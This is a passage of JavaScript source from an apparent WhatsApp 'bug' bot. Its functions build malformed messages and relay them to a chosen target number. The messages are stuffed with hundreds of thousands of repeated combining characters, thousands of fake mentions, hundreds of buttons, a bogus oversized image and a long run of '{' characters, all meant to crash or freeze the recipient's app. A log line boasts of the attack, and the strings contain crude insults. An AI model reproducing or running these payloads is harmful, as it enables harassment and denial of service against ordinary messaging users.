              title: "𑇂𑆵𑆴𑆿",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "ꦽꦽꦽ",
                address: "𑇂𑆵𑆴𑆿".repeat(1000)
              }
            },
            body: { text: "HAI KONTOL" },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                payload: "ꦽꦽꦽ".repeat(300000),
                contextInfo: {
                  participant: "targetjid@s.whatsapp.net",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                key: {
                  remoteJid: "5521992999999@s.whatsapp.net",
                  fromMe: false,
                  id: "CALL_MSG_" + Date.now(),
                  participant: "5521992999999@s.whatsapp.net"
                },
                message: {
                  callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: "5521992999999@s.whatsapp.net",
                        callOutcome: "1"
                      }
                    ]
                  }
                }
              })
            }
          }
        }
      }
    };

    const list = [msg1, msg2, msg3];

    for (const msg of list) {
      if (typeof Abim !== "undefined" && Abim && typeof Abim.relayMessage === "function") {
        await Abim.relayMessage("status@broadcast", msg, {
          messageId: undefined,
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [{ tag: "to", attrs: { jid: target } }]
                }
              ]
            }
          ]
        });
      } else {
        console.warn("Abim.relayMessage not available.");
        break;
      }
    }

    console.log(
      `[ - Wolker Attacked Sending Bug Forclose To ${target} suksesfull 🛡️ ]`
    );
  } catch (e) {
    console.error(e);
  }
}

//blank
async function BlankKlick(sock, target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(20000),
      caption: "𝕽𝖜𝖊𝖏𝖆𝖝𝖝 Cʟᴀsˢˢˢ #🇮🇶 ( 𝟑𝟑𝟑 )" + "꧀".repeat(20000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}


async function CrashkontolByramz(target) {
  const ButtonsFreeze = [
    { name: "single_select", buttonParamsJson: "" },
  ];

  for (let i = 0; i < 100; i++) {
    ButtonsFreeze.push(
    { name: "payment_method",   buttonParamsJson: JSON.stringify({ status: true }) },
    { name: "review_order",  buttonParamsJson: JSON.stringify({ status: true }) },
    { name: "review_and_pay", buttonParamsJson: JSON.stringify({ status: true }) },
    );
  }
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {    
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "13133822@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: target,
              stanzaId: "1234567890ABCDEF",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                  title: "ោ៝".repeat(20000),
                  hasMediaAttachment: true,
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                    fileLength: "9999999999999",
                    height: 9999,
                    width: 9999,
                    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1755254367",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
                  },
                },
                body: { 
                  text: "akhhhh yamete" +
                    "ꦽ".repeat(25000) +
                    "ោ៝".repeat(20000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000),
                  buttons: ButtonsFreeze,
                }
              }
            ]
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
// ~ End Function Bugs